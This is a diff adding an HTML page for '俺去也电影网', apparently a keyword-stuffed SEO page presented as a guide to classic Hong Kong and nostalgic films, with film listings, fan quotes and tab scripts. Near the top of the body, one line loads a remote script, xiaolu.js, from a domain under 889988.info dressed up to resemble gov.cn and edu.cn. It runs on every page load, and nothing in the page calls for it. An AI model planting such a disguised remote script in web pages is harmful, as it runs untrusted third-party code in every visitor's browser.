@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>俺去也电影网 - 老影迷的宝藏片库 · 经典港片与怀旧佳片导航 | https://anquyedianyingwang-wap.github.io</title>
+<meta name="description" content="俺去也电影网（https://anquyedianyingwang-wap.github.io）是老影迷的宝藏片库，专注经典港片、怀旧佳片与年代电影推荐，重温大银幕的黄金年代。">
+<meta name="keywords" content="俺去也电影网, 经典港片, 怀旧电影, 老电影推荐, 年代片单, 港片黄金年代, anquyedianyingwang-wap.github.io">
+<meta name="author" content="俺去也电影网">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1a0a0a">
+<link rel="canonical" href="https://anquyedianyingwang-wap.github.io/">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE" />
+<meta property="og:title" content="俺去也电影网 - 老影迷的宝藏片库">
+<meta property="og:description" content="俺去也电影网（https://anquyedianyingwang-wap.github.io）专注经典港片与怀旧佳片推荐，重温大银幕的黄金年代。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://anquyedianyingwang-wap.github.io/">
+<meta property="og:site_name" content="俺去也电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="俺去也电影网 - 老影迷的宝藏片库">
+<meta name="twitter:description" content="俺去也电影网（https://anquyedianyingwang-wap.github.io）专注经典港片与怀旧佳片推荐，重温大银幕的黄金年代。">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Songti SC",Georgia,serif;
+  line-height:1.85;color:#f0e6d2;background:#160c0c;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+button{font-family:inherit;cursor:pointer;border:none;}
+::selection{background:#e63946;color:#fff;}
+
+:root{
+  --ink:#160c0c;--paper:#f7f0e1;--card:#221414;--line:#3a2c25;
+  --red:#e63946;--gold:#e0a458;--teal:#2a9d8f;--cream:#f0e6d2;--dim:#a99a86;
+}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px;}
+
+/* ===== 噪点纸纹 ===== */
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:radial-gradient(rgba(255,255,255,.025) 1px,transparent 1px);
+  background-size:3px 3px;opacity:.6;}
+
+/* ===== 顶部通告 ===== */
+.marq{background:var(--red);color:#fff;font-size:13px;padding:7px 0;position:relative;z-index:12;overflow:hidden;}
+.marq span{display:inline-block;white-space:nowrap;padding-left:100%;animation:scroll 28s linear infinite;}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+.marq b{font-family:monospace;letter-spacing:1px;}
+
+/* ===== 头部 ===== */
+header{position:relative;z-index:11;background:rgba(22,12,12,.94);border-bottom:3px double var(--line);}
+.hd-in{max-width:1180px;margin:0 auto;padding:14px 22px;display:flex;align-items:center;justify-content:space-between;gap:18px;}
+.logo{display:flex;flex-direction:column;line-height:1.1;}
+.logo b{font-size:30px;font-weight:900;letter-spacing:2px;color:var(--paper);font-family:"Songti SC",Georgia,serif;}
+.logo b i{font-style:normal;color:var(--red);}
+.logo small{font-size:11px;color:var(--dim);letter-spacing:2px;font-family:monospace;}
+.nav{display:flex;gap:2px;}
+.nav a{font-size:14px;font-weight:600;padding:8px 13px;border-bottom:2px solid transparent;transition:.2s;color:#d8cdb8;}
+.nav a:hover{border-bottom-color:var(--red);color:#fff;}
+.hd-btn{background:var(--red);color:#fff;padding:9px 20px;border-radius:2px;font-size:14px;font-weight:700;font-family:"Songti SC",Georgia,serif;transition:.2s;}
+.hd-btn:hover{background:#c92b38;}
+.mob{display:none;width:44px;height:44px;background:var(--card);color:var(--paper);font-size:22px;border:1px solid var(--line);}
+.mmenu{display:none;flex-direction:column;background:var(--ink);border-top:1px solid var(--line);position:relative;z-index:11;}
+.mmenu.open{display:flex;}
+.mmenu a{padding:15px 22px;border-bottom:1px solid var(--line);font-weight:600;}
+
+/* ===== 通用区块 ===== */
+section{padding:78px 0;position:relative;z-index:2;}
+.alt{background:#1d1111;}
+.head{max-width:680px;margin:0 auto 46px;text-align:center;}
+.head .no{font-family:monospace;font-size:13px;color:var(--gold);letter-spacing:3px;display:block;margin-bottom:10px;}
+.head h2{font-size:32px;font-weight:900;font-family:"Songti SC",Georgia,serif;letter-spacing:1px;margin-bottom:12px;color:var(--paper);}
+.head h2 em{font-style:normal;color:var(--red);}
+.head p{color:var(--dim);font-size:15px;}
+
+/* ===== Hero 轮播式 ===== */
+.hero{padding:0;position:relative;z-index:2;}
+.tape{display:grid;grid-template-columns:1fr 1fr;min-height:560px;}
+.tape-l{padding:70px 60px;display:flex;flex-direction:column;justify-content:center;background:linear-gradient(160deg,#221414,#160c0c);position:relative;}
+.tape-l::after{content:"放映中";position:absolute;top:30px;right:30px;background:var(--red);color:#fff;font-size:12px;padding:4px 12px;border-radius:2px;font-weight:700;letter-spacing:2px;}
+.tape-l .stamp{font-family:monospace;font-size:12px;color:var(--gold);letter-spacing:2px;margin-bottom:18px;}
+.tape-l h1{font-size:52px;font-weight:900;line-height:1.18;font-family:"Songti SC",Georgia,serif;margin-bottom:8px;color:var(--paper);}
+.tape-l h1 i{font-style:normal;color:var(--red);}
+.tape-l .sub{font-size:19px;color:var(--gold);margin-bottom:24px;font-family:"Songti SC",Georgia,serif;}
+.tape-l p{color:#cbb89c;font-size:16px;max-width:440px;margin-bottom:30px;}
+.tape-l .acts{display:flex;gap:14px;flex-wrap:wrap;}
+.tape-l .acts a{padding:13px 28px;font-weight:700;font-size:15px;transition:.2s;font-family:"Songti SC",Georgia,serif;}
+.acts .p1{background:var(--red);color:#fff;}
+.acts .p1:hover{background:#c92b38;}
+.acts .p2{background:transparent;color:var(--paper);border:1px solid var(--line);}
+.acts .p2:hover{border-color:var(--red);color:var(--red);}
+
+.tape-r{position:relative;background:linear-gradient(135deg,#3a1c12,#1a0a0a);display:flex;align-items:center;justify-content:center;padding:40px;overflow:hidden;}
+.reel{width:100%;max-width:440px;border:2px solid var(--gold);padding:22px;background:rgba(0,0,0,.35);transform:rotate(-1.5deg);}
+.reel .stripe{height:3px;background:repeating-linear-gradient(90deg,var(--red) 0 12px,var(--gold) 12px 24px);margin-bottom:18px;}
+.reel h3{font-family:"Songti SC",Georgia,serif;font-size:22px;margin-bottom:18px;color:var(--paper);}
+.reel ol{counter-reset:r;list-style:none;}
+.reel ol li{counter-increment:r;display:flex;align-items:center;gap:14px;padding:10px 0;border-bottom:1px dashed var(--line);font-size:15px;}
+.reel ol li::before{content:"卷" counter(r);font-family:monospace;font-size:11px;background:var(--red);color:#fff;padding:2px 8px;flex-shrink:0;}
+.reel ol li span{margin-left:auto;color:var(--gold);font-size:13px;}
+.tape-r .corner{position:absolute;width:70px;height:70px;border:3px solid var(--red);}
+.tl{top:24px;left:24px;border-right:none;border-bottom:none;}
+.tr{top:24px;right:24px;border-left:none;border-bottom:none;}
+.bl{bottom:24px;left:24px;border-right:none;border-top:none;}
+.br{bottom:24px;right:24px;border-left:none;border-top:none;}
+
+/* ===== 栏目一：年代索引 ===== */
+.decades{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;}
+.dec{border:1px solid var(--line);background:var(--card);padding:26px 18px;text-align:center;transition:.25s;position:relative;}
+.dec:hover{border-color:var(--red);background:#2a1a1a;transform:translateY(-5px);}
+.dec .yr{font-family:"Songti SC",Georgia,serif;font-size:32px;font-weight:900;color:var(--red);line-height:1;}
+.dec .ln{width:30px;height:2px;background:var(--gold);margin:12px auto;}
+.dec h3{font-size:16px;margin-bottom:8px;color:var(--paper);}
+.dec p{font-size:13px;color:var(--dim);}
+
+/* ===== 栏目二：本周放映 ===== */
+.now{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;}
+.show{border:1px solid var(--line);background:#1b1010;overflow:hidden;transition:.3s;}
+.show:hover{transform:scale(1.02);border-color:var(--gold);}
+.show .cap{height:180px;display:flex;align-items:center;justify-content:center;position:relative;}
+.show .cap::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.18) 3px,rgba(0,0,0,.18) 4px);}
+.show .cap b{font-size:44px;font-family:"Songti SC",Georgia,serif;color:rgba(255,255,255,.9);z-index:1;}
+.show .cap span{position:absolute;top:14px;left:14px;background:var(--paper);color:var(--ink);font-size:12px;padding:3px 10px;font-weight:700;z-index:2;}
+.show .body{padding:20px;}
+.show .body h3{font-size:19px;font-family:"Songti SC",Georgia,serif;margin-bottom:8px;color:var(--paper);}
+.show .body p{font-size:13px;color:var(--dim);margin-bottom:14px;}
+.show .body .ft{display:flex;justify-content:space-between;font-size:12px;color:var(--gold);border-top:1px dashed var(--line);padding-top:12px;}
+
+/* ===== 栏目三：老影迷语录 ===== */
+.quotes{display:grid;grid-template-columns:repeat(2,1fr);gap:22px;}
+.qt{border-left:4px solid var(--red);background:var(--card);padding:26px 28px;position:relative;transition:.25s;}
+.qt:hover{background:#2a1a1a;}
+.qt .op{font-family:"Songti SC",Georgia,serif;font-size:38px;color:var(--gold);position:absolute;top:14px;right:22px;opacity:.4;line-height:1;}
+.qt blockquote{font-size:16px;font-style:italic;color:#d8cdb8;margin-bottom:16px;font-family:"Songti SC",Georgia,serif;line-height:1.8;}
+.qt cite{font-size:13px;color:var(--red);font-style:normal;font-weight:700;}
+
+/* ===== 栏目四：放映厅（标签页） ===== */
+.tabs{display:flex;gap:4px;flex-wrap:wrap;justify-content:center;margin-bottom:30px;border-bottom:2px solid var(--line);padding-bottom:14px;}
+.tabs button{background:transparent;color:var(--dim);padding:9px 22px;font-size:14px;font-weight:700;font-family:"Songti SC",Georgia,serif;border-bottom:3px solid transparent;margin-bottom:-16px;transition:.2s;}
+.tabs button.on{color:var(--paper);border-bottom-color:var(--red);}
+.tabs button:hover{color:var(--paper);}
+.tabpane{display:none;grid-template-columns:repeat(4,1fr);gap:18px;}
+.tabpane.on{display:grid;animation:fade .35s;}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.cell{border:1px solid var(--line);background:#1b1010;padding:18px;transition:.25s;}
+.cell:hover{border-color:var(--gold);background:#261616;}
+.cell .yr{font-family:monospace;font-size:12px;color:var(--red);margin-bottom:6px;}
+.cell h4{font-size:16px;font-family:"Songti SC",Georgia,serif;margin-bottom:8px;color:var(--paper);}
+.cell p{font-size:13px;color:var(--dim);}
+
+/* ===== 栏目五：关于 ===== */
+.abt{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center;}
+.abt .txt h2{font-size:30px;font-family:"Songti SC",Georgia,serif;margin-bottom:16px;color:var(--paper);}
+.abt .txt h2 i{font-style:normal;color:var(--red);}
+.abt .txt p{color:#cbb89c;margin-bottom:16px;font-size:15px;}
+.abt .txt .url{font-family:monospace;color:var(--gold);font-size:14px;background:var(--card);border:1px dashed var(--line);padding:12px 16px;display:inline-block;}
+.timeline{border-left:2px solid var(--line);padding-left:26px;}
+.timeline div{position:relative;margin-bottom:26px;}
+.timeline div::before{content:"";position:absolute;left:-33px;top:6px;width:12px;height:12px;background:var(--red);border-radius:50%;border:2px solid var(--ink);}
+.timeline div b{display:block;font-family:"Songti SC",Georgia,serif;font-size:19px;color:var(--paper);}
+.timeline div span{font-size:14px;color:var(--dim);}
+
+/* ===== 页脚 ===== */
+footer{background:#0f0808;border-top:3px double var(--line);padding:50px 0 24px;position:relative;z-index:2;}
+.ft-in{max-width:1180px;margin:0 auto;padding:0 22px;display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;}
+.ft-in .b p{font-size:14px;color:var(--dim);margin:14px 0;max-width:320px;}
+.ft-in .b .u{font-family:monospace;color:var(--gold);font-size:13px;}
+.ft-in h4{font-size:15px;margin-bottom:16px;color:var(--paper);font-family:"Songti SC",Georgia,serif;}
+.ft-in ul li{margin-bottom:10px;}
+.ft-in a{font-size:14px;color:var(--dim);transition:.2s;}
+.ft-in a:hover{color:var(--red);}
+.fbot{max-width:1180px;margin:34px auto 0;padding:20px 22px 0;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:13px;color:var(--dim);font-family:monospace;}
+
+#top{position:fixed;right:22px;bottom:22px;width:46px;height:46px;background:var(--red);color:#fff;font-size:20px;opacity:0;pointer-events:none;transition:.3s;z-index:99;}
+#top.show{opacity:1;pointer-events:auto;}
+
+@media(max-width:960px){
+  .tape{grid-template-columns:1fr;}
+  .tape-l{padding:50px 30px;}
+  .tape-l h1{font-size:38px;}
+  .decades{grid-template-columns:repeat(3,1fr);}
+  .now,.quotes,.tabpane.on{grid-template-columns:1fr 1fr;}
+  .abt{grid-template-columns:1fr;gap:34px;}
+  .tape-r{min-height:420px;}
+}
+@media(max-width:600px){
+  .nav,.hd-btn{display:none;}
+  .mob{display:block;}
+  .head h2{font-size:22px;}
+  .tape-l h1{font-size:30px;}
+  .tape-l .sub{font-size:16px;}
+  .decades,.now,.quotes,.tabpane.on{grid-template-columns:1fr;}
+  .ft-in{grid-template-columns:1fr;}
+  .fbot{flex-direction:column;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="marq"><span><b>◆ 放映中 ◆</b> 俺去也电影网（https://anquyedianyingwang-wap.github.io）——老影迷的宝藏片库，经典港片 · 怀旧佳片 · 年代电影，持续放映中 <b>◆ NEW ◆</b> 2026 春季港片修复展映单元上线</span></div>
+
+<header>
+  <div class="hd-in">
+    <a href="https://anquyedianyingwang-wap.github.io" class="logo">
+      <b>俺去也<i>电影网</i></b>
+      <small>ANQUYE · DIANYING · WANG</small>
+    </a>
+    <nav class="nav">
+      <a href="#top">首页</a>
+      <a href="#dec">年代索引</a>
+      <a href="#now">本周放映</a>
+      <a href="#hall">放映厅</a>
+      <a href="#talk">老影迷说</a>
+      <a href="#about">关于</a>
+    </nav>
+    <a href="#now" class="hd-btn">进场观影</a>
+    <button class="mob" id="mob">☰</button>
+  </div>
+  <nav class="mmenu" id="mmenu">
+    <a href="#top">首页</a><a href="#dec">年代索引</a><a href="#now">本周放映</a>
+    <a href="#hall">放映厅</a><a href="#talk">老影迷说</a><a href="#about">关于</a>
+  </nav>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <div class="tape">
+    <div class="tape-l">
+      <div class="stamp">// 每日放映 14:00 - 23:00 //</div>
+      <h1>俺去也<br><i>看电影</i></h1>
+      <div class="sub">老影迷的宝藏片库 · 经典港片与怀旧佳片</div>
+      <p>俺去也电影网（<strong>https://anquyedianyingwang-wap.github.io</strong>）不追新潮，专收被时光筛过的好片。港片黄金年代、90 年代录像厅记忆、那些年一起追的碟——这里都有。</p>
+      <div class="acts">
+        <a href="#now" class="p1">查看本周放映</a>
+        <a href="#hall" class="p2">进入放映厅</a>
+      </div>
+    </div>
+    <div class="tape-r">
+      <div class="corner tl"></div><div class="corner tr"></div>
+      <div class="corner bl"></div><div class="corner br"></div>
+      <div class="reel">
+        <div class="stripe"></div>
+        <h3>📽 放映节目单 · 精选五部</h3>
+        <ol>
+          <li>英雄本色 修复版 <span>1986</span></li>
+          <li>阿飞正传 4K 重制 <span>1990</span></li>
+          <li>无间道 导演剪辑 <span>2002</span></li>
+          <li>东邪西毒 终极版 <span>1994</span></li>
+          <li>枪火 杜琪峰经典 <span>1999</span></li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：年代索引 -->
+<section id="dec">
+  <div class="wrap">
+    <div class="head">
+      <span class="no">SECTION 01 / 年代索引</span>
+      <h2>按<em>年代</em>找片</h2>
+      <p>从 70 年代到千禧年，每个年代都有属于自己的影像记忆。选一个年代，走进当年的录像厅。</p>
+    </div>
+    <div class="decades">
+      <a href="#" class="dec"><div class="yr">70s</div><div class="ln"></div><h3>新浪潮</h3><p>香港新浪潮与早期武侠经典</p></a>
+      <a href="#" class="dec"><div class="yr">80s</div><div class="ln"></div><h3>英雄片时代</h3><p>警匪、江湖、枪战与义气</p></a>
+      <a href="#" class="dec"><div class="yr">90s</div><div class="ln"></div><h3>黄金十年</h3><p>港片产量与质量的巅峰</p></a>
+      <a href="#" class="dec"><div class="yr">00s</div><div class="ln"></div><h3>新港味</h3><p>类型片成熟与合拍起步</p></a>
+      <a href="#" class="dec"><div class="yr">10s+</div><div class="ln"></div><h3>新经典</h3><p>新生代导演与修复重映</p></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：本周放映 -->
+<section id="now" class="alt">
+  <div class="wrap">
+    <div class="head">
+      <span class="no">SECTION 02 / 本周放映</span>
+      <h2>本周<em>放映厅</em>排片</h2>
+      <p>编辑部每周精挑细选五部，从修复经典到冷门遗珠，场场值得进场。</p>
+    </div>
+    <div class="now">
+      <article class="show">
+        <div class="cap" style="background:linear-gradient(135deg,#7f1d1d,#dc2626)"><span>本周主打</span><b>无间道</b></div>
+        <div class="body"><h3>无间道 · 导演剪辑版</h3><p>2002 / 犯罪 / 刘德华 · 梁朝伟 · 黄秋生</p><div class="ft"><span>★ 9.2 综合</span><span>导演剪辑</span></div></div>
+      </article>
+      <article class="show">
+        <div class="cap" style="background:linear-gradient(135deg,#7c3aed,#a21caf)"><span>修复重映</span><b>英雄本色</b></div>
+        <div class="body"><h3>英雄本色 · 4K 修复</h3><p>1986 / 犯罪 / 周润发 · 狄龙 · 张国荣</p><div class="ft"><span>★ 9.0 综合</span><span>4K修复</span></div></div>
+      </article>
+      <article class="show">
+        <div class="cap" style="background:linear-gradient(135deg,#92400e,#d97706)"><span>冷门遗珠</span><b>枪火</b></div>
+        <div class="body"><h3>枪火 · 杜琪峰经典</h3><p>1999 / 犯罪 / 黄秋生 · 吴镇宇 · 吕颂贤</p><div class="ft"><span>★ 8.8 综合</span><span>冷门推荐</span></div></div>
+      </article>
+      <article class="show">
+        <div class="cap" style="background:linear-gradient(135deg,#0f766e,#14b8a6)"><span>文艺经典</span><b>阿飞正传</b></div>
+        <div class="body"><h3>阿飞正传 · 4K 重制</h3><p>1990 / 剧情 / 张国荣 · 张曼玉 · 刘德华</p><div class="ft"><span>★ 9.1 综合</span><span>4K重制</span></div></div>
+      </article>
+      <article class="show">
+        <div class="cap" style="background:linear-gradient(135deg,#831843,#e11d48)"><span>武侠巅峰</span><b>东邪西毒</b></div>
+        <div class="body"><h3>东邪西毒 · 终极版</h3><p>1994 / 武侠 / 张国荣 · 梁家辉 · 林青霞</p><div class="ft"><span>★ 8.7 综合</span><span>终极版</span></div></div>
+      </article>
+      <article class="show">
+        <div class="cap" style="background:linear-gradient(135deg,#1e3a8a,#3b82f6)"><span>黑色幽默</span><b>低俗小说</b></div>
+        <div class="body"><h3>低俗小说 · 非线性经典</h3><p>1994 / 犯罪 / 约翰·特拉沃尔塔 · 乌玛·瑟曼</p><div class="ft"><span>★ 9.3 综合</span><span>非线性叙事</span></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：老影迷语录 -->
+<section id="talk">
+  <div class="wrap">
+    <div class="head">
+      <span class="no">SECTION 03 / 老影迷说</span>
+      <h2>老<em>影迷</em>怎么看</h2>
+      <p>电影是记忆的载体。那些被反复回味的片段，其实是我们回不去的自己。</p>
+    </div>
+    <div class="quotes">
+      <div class="qt">
+        <span class="op">"</span>
+        <blockquote>当年录像厅里，小马哥的风衣和双枪，是我整个少年时代关于"帅"的全部想象。</blockquote>
+        <cite>—— 录像厅老主顾 · 阿杰</cite>
+      </div>
+      <div class="qt">
+        <span class="op">"</span>
+        <blockquote>好电影像老酒，年份越久越有味道。现在回头看，才发现每个镜头都在说话。</blockquote>
+        <cite>—— 独立影评人 · 老周</cite>
+      </div>
+      <div class="qt">
+        <span class="op">"</span>
+        <blockquote>港片教会我一件事：江湖不只是打打杀杀，还有兄弟、道义和那份不肯低头的体面。</blockquote>
+        <cite>—— 港片研究者 · 阿May</cite>
+      </div>
+      <div class="qt">
+        <span class="op">"</span>
+        <blockquote>现在的大银幕越来越花哨，反倒怀念那种几个人挤在录像厅，屏住呼吸看结局的日子。</blockquote>
+        <cite>—— 资深影迷 · 大飞</cite>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：放映厅 -->
+<section id="hall" class="alt">
+  <div class="wrap">
+    <div class="head">
+      <span class="no">SECTION 04 / 放映厅</span>
+      <h2>放映<em>厅</em> · 类型片库</h2>
+      <p>按类型进入不同放映厅，每个厅都有专属的片单与讲解。</p>
+    </div>
+    <div class="tabs">
+      <button class="on" data-t="t1">江湖警匪</button>
+      <button data-t="t2">文艺剧情</button>
+      <button data-t="t3">武侠功夫</button>
+      <button data-t="t4">黑色幽默</button>
+    </div>
+    <div class="tabpane on" id="t1">
+      <div class="cell"><div class="yr">1986</div><h4>英雄本色</h4><p>吴宇森导演，港片英雄片的里程碑之作。</p></div>
+      <div class="cell"><div class="yr">1999</div><h4>枪火</h4><p>杜琪峰极简美学与站位调度教科书。</p></div>
+      <div class="cell"><div class="yr">2002</div><h4>无间道</h4><p>双卧底叙事，港产警匪片的集大成者。</p></div>
+      <div class="cell"><div class="yr">1996</div><h4>十万火急</h4><p>杜琪峰消防题材，被低估的硬派佳作。</p></div>
+    </div>
+    <div class="tabpane" id="t2">
+      <div class="cell"><div class="yr">1990</div><h4>阿飞正传</h4><p>王家卫关于无脚鸟的孤独寓言。</p></div>
+      <div class="cell"><div class="yr">1994</div><h4>东邪西毒</h4><p>武侠外壳下的现代情感寓言。</p></div>
+      <div class="cell"><div class="yr">1997</div><h4>春光乍泄</h4><p>布宜诺斯艾利斯里的爱情与漂泊。</p></div>
+      <div class="cell"><div class="yr">2000</div><h4>花样年华</h4><p>最克制的暧昧，最浓烈的孤独。</p></div>
+    </div>
+    <div class="tabpane" id="t3">
+      <div class="cell"><div class="yr">1973</div><h4>龙争虎斗</h4><p>李小龙功夫电影的国际化起点。</p></div>
+      <div class="cell"><div class="yr">2000</div><h4>卧虎藏龙</h4><p>李安的东方诗意与江湖美学。</p></div>
+      <div class="cell"><div class="yr">2004</div><h4>功夫</h4><p>周星驰的漫画式功夫狂欢。</p></div>
+      <div class="cell"><div class="yr">2013</div><h4>一代宗师</h4><p>王家卫的武林史诗与人生况味。</p></div>
+    </div>
+    <div class="tabpane" id="t4">
+      <div class="cell"><div class="yr">1994</div><h4>低俗小说</h4><p>塔伦蒂诺的环形叙事与黑色趣味。</p></div>
+      <div class="cell"><div class="yr">1992</div><h4>辣手神探</h4><p>吴宇森暴力美学的极致表达。</p></div>
+      <div class="cell"><div class="yr">1995</div><h4>堕落天使</h4><p>王家卫夜色里的孤独与相遇。</p></div>
+      <div class="cell"><div class="yr">2006</div><h4>疯狂的石头</h4><p>宁浩的多线黑色喜剧经典。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：关于 -->
+<section id="about">
+  <div class="wrap">
+    <div class="head">
+      <span class="no">SECTION 05 / 关于本站</span>
+      <h2>关于俺去也<em>电影网</em></h2>
+      <p>一群把电影当回忆的人，做的回忆放映室。</p>
+    </div>
+    <div class="abt">
+      <div class="txt">
+        <h2>俺去也，<i>去看一场老电影</i></h2>
+        <p>俺去也电影网（https://anquyedianyingwang-wap.github.io）不追逐院线热度，只收藏那些被时间验证过的好片。我们相信，一部真正的好电影，值得在不同年纪反复进场。</p>
+        <p>网站内容涵盖经典港片、怀旧佳片、年代电影推荐与影迷回忆，每周更新放映排片与深度解读。</p>
+        <div class="url">网址：https://anquyedianyingwang-wap.github.io</div>
+      </div>
+      <div class="timeline">
+        <div><b>第一步 · 选片</b><span>编辑部按口碑、影响力、可重温度三重筛选</span></div>
+        <div><b>第二步 · 修复</b><span>优先推荐 4K 修复、导演剪辑等优质版本</span></div>
+        <div><b>第三步 · 解读</b><span>配套影评与幕后资料，看懂镜头背后的表达</span></div>
+        <div><b>第四步 · 放映</b><span>每周更新放映排片，持续放映不停机</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="ft-in">
+    <div class="b">
+      <b style="font-size:26px;font-family:'Songti SC',Georgia,serif;color:var(--paper);">俺去也<i style="font-style:normal;color:var(--red);">电影网</i></b>
+      <p>俺去也电影网（https://anquyedianyingwang-wap.github.io）是老影迷的宝藏片库，专注经典港片、怀旧佳片与年代电影推荐，重温大银幕的黄金年代。</p>
+      <div class="u">ANQUYEDIANYINGWANG-WAP.GITHUB.IO</div>
+    </div>
+    <div><h4>年代索引</h4><ul>
+      <li><a href="#">70 年代新浪潮</a></li><li><a href="#">80 年代英雄片</a></li><li><a href="#">90 年代黄金期</a></li><li><a href="#">00 年代新港味</a></li>
+    </ul></div>
+    <div><h4>放映厅</h4><ul>
+      <li><a href="#">江湖警匪</a></li><li><a href="#">文艺剧情</a></li><li><a href="#">武侠功夫</a></li><li><a href="#">黑色幽默</a></li>
+    </ul></div>
+    <div><h4>关于</h4><ul>
+      <li><a href="#">网站介绍</a></li><li><a href="#">投稿与合作</a></li><li><a href="#">免责声明</a></li><li><a href="#">隐私政策</a></li><li><a href="#">意见反馈</a></li>
+    </ul></div>
+  </div>
+  <div class="fbot">
+    <span>© 2026 俺去也电影网（https://anquyedianyingwang-wap.github.io）版权所有</span>
+    <span>本站仅提供影视资讯与推荐服务 · 请支持正版内容</span>
+  </div>
+</footer>
+
+<button id="top" aria-label="回到顶部">↑</button>
+
+<script>
+document.getElementById('mob').addEventListener('click',function(){
+  document.getElementById('mmenu').classList.toggle('open');
+});
+document.querySelectorAll('#mmenu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('mmenu').classList.remove('open');});
+});
+var tabs=document.querySelectorAll('.tabs button');
+var panes=document.querySelectorAll('.tabpane');
+tabs.forEach(function(t){
+  t.addEventListener('click',function(){
+    tabs.forEach(function(x){x.classList.remove('on');});
+    panes.forEach(function(p){p.classList.remove('on');});
+    t.classList.add('on');
+    document.getElementById(t.dataset.t).classList.add('on');
+  });
+});
+var topBtn=document.getElementById('top');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400);});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
